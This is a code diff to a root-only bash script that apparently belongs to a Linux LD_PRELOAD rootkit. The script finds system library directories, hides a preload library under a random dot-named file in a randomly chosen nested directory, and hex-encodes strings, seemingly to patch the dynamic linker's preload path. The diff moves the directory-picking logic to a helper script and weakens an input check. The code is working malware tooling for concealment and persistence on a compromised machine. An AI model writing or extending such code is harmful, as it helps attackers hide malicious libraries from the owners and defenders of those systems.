@@ -1,6 +1,6 @@
 #!/bin/bash
 
-[ $(id -u) != 0 ] || [ -z $1 ] || [ ! -f $1 ] && exit
+[ $(id -u) != 0 ] || [ -z $1 ] && exit
 
 O_PRELOAD="$1"
 LDIRS=("/lib/" "/lib/x86_64-linux-gnu/" "/lib/i386-linux-gnu/" "/lib32/" "/libx32/" "/lib64/")
@@ -17,23 +17,8 @@ gldlocs()
     done
 }
 
-# `gnpreload` uses this function to seek a home, for the npreload file, two directories deep
-grecurdir()
-{
-    local cpdir="/notarealdir/"
-    while [ ! -d "$cpdir" ]; do
-        cpdir="${PDIRS[$RANDOM % ${#PDIRS[@]}]}"
-        [ ! -d $cpdir ] && continue
-        idirs="$(echo `ls -Ud ${cpdir}*/ 2>&1 | head -8`)" # get 1st 8 dirs in curdir, pipe stderr to stdout
-        [[ "$idirs" == *"cannot access"* ]] && continue    # if the cur directory doesn't have any dirs in it, go next
-        IFS=' ' read -a idir <<< "$idirs" # read the list of files into an array called idir
-        cpdir="${idir[$RANDOM % ${#idir[@]}]}" # pick a random directory from the array
-    done
-    echo -n $cpdir
-}
-
 # builds new location string for the preload file.
-gnpreload(){ echo -n "`grecurdir`.`cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 8 | head -n 1`"; }
+gnpreload(){ echo -n "$(bash ./get_recurdir.sh).`cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 8 | head -n 1`"; }
 
 hstr(){ local HS="`xxd -p <<< "$1"`"; echo -n "${HS::-2}00" | awk '{print toupper($0)}'; }
 
